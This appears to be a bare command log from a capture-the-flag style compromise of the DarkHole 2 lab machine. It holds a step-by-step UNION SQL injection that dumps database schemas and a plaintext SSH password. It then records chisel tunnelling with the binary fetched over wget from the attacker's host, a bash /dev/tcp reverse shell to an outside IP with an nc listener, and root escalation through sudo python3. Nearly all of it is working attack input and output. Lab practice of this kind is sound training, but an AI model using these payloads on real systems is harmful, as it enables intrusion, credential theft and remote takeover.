## init
```bash
hostname -I
arp-scan -I wlo1 --localnet

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.16 -oG allPorts

locate .nse

nmap -sCV -p22,80 192.168.1.16 -oN targeted

locate http-git.nse
whatweb http://192.168.1.16

git log
git log --oneline
git show a4d900a

# in burpsuite doing GET 
GET /dashboard.php?id=1'+order+by+6--+- HTTP/1.1
Host: 192.168.1.11
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=llbdf7pj56p5b0fd7768eag97j
Upgrade-Insecure-Requests: 1
Priority: u=0, i

GET /dashboard.php?id=2'+union+select+1,2,3,4,5,6--+- HTTP/1.1
Host: 192.168.1.11
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=llbdf7pj56p5b0fd7768eag97j
Upgrade-Insecure-Requests: 1
Priority: u=0, i

GET /dashboard.php?id=2'+union+select+1,2,schema_name,4,5,6+from+information_schema.schemata--+- HTTP/1.1
Host: 192.168.1.11
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=llbdf7pj56p5b0fd7768eag97j
Upgrade-Insecure-Requests: 1
Priority: u=0, i

GET /dashboard.php?id=2'+union+select+1,2,group_concat(schema_name),4,5,6+from+information_schema.schemata--+- HTTP/1.1
Host: 192.168.1.11
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=llbdf7pj56p5b0fd7768eag97j
Upgrade-Insecure-Requests: 1
Priority: u=0, i


 <input type="email" name="email" id="email" maxlength="150" value="mysql,information_schema,performance_schema,sys,darkhole_2" required /> # db response

GET /dashboard.php?id=2'+union+select+1,2,group_concat(table_name),4,5,6+from+information_schema.tables+where+table_schema+%3d+'darkhole_2'--+- HTTP/1.1
Host: 192.168.1.11
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=llbdf7pj56p5b0fd7768eag97j
Upgrade-Insecure-Requests: 1
Priority: u=0, i

GET /dashboard.php?id=2'+union+select+1,2,group_concat(column_name),4,5,6+from+information_schema.columns+where+table_schema+%3d+'darkhole_2'+and+table_name+%3d+'users'--+- HTTP/1.1
Host: 192.168.1.11
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=llbdf7pj56p5b0fd7768eag97j
Upgrade-Insecure-Requests: 1
Priority: u=0, i

 <input type="email" name="email" id="email" maxlength="150" value="address,contact_number,email,id,password,username" required />

 # viewing ssh table
 GET /dashboard.php?id=2'+union+select+1,2,group_concat(column_name),4,5,6+from+information_schema.columns+where+table_schema+%3d+'darkhole_2'+and+table_name+%3d+'ssh'--+- HTTP/1.1
Host: 192.168.1.11
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=llbdf7pj56p5b0fd7768eag97j
Upgrade-Insecure-Requests: 1
Priority: u=0, i

 <input type="email" name="email" id="email" maxlength="150" value="id,pass,user" required />

GET /dashboard.php?id=2'+union+select+1,2,group_concat(user,0x3a,pass),4,5,6+from+ssh--+- HTTP/1.1
Host: 192.168.1.11
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=llbdf7pj56p5b0fd7768eag97j
Upgrade-Insecure-Requests: 1
Priority: u=0, i

 <input type="email" name="email" id="email" maxlength="150" value="jehad:fool" required />

ssh jehad@192.168.1.11 # pass:fool
cat .bash_history | less
netstat -nat
ps -faux | grep 9999
cd /opt/web

curl -X GET "http://localhost:9999/index.php?cmd=whoami"; echo

# Ussing chisel for tuneling (cant detect open port externally)
https://github.com/jpillora/chisel/releases/tag/v1.10.1

gunzip chisel
chmod +x chisel
# shere chisel, localy must be server and in victim's machine must be client

python3 -m http.server 80
wget http://192.168.1.12/chisel # in client in /tmp

./chisel server --reverse -p 1234 # local
/chisel client 192.168.1.12:1234 R:8080:127.0.0.1:9999 # victims remote

ssh jehad@192.168.1.11 -L 9999:127.0.0.1:9999 # using ssh

bash -c "bash -i >& /dev/tcp/192.168.1.12/443 0>&1" # remote vicitme in url
bash -c "bash -i >%26 /dev/tcp/192.168.1.12/443 0>%261" # remote vicitme in url
nc -nlvp 443 # local machine reverse shell

cat user.txt
DarkHole{'This_is_the_life_man_better_than_a_cruise'}

find \.perm -4000 2>/dev/null

ls -l

sudo -l -S
sudo -l

sudo -u root python3
import os
os.system("whoami")
os.system("bash")


cd /root/

```
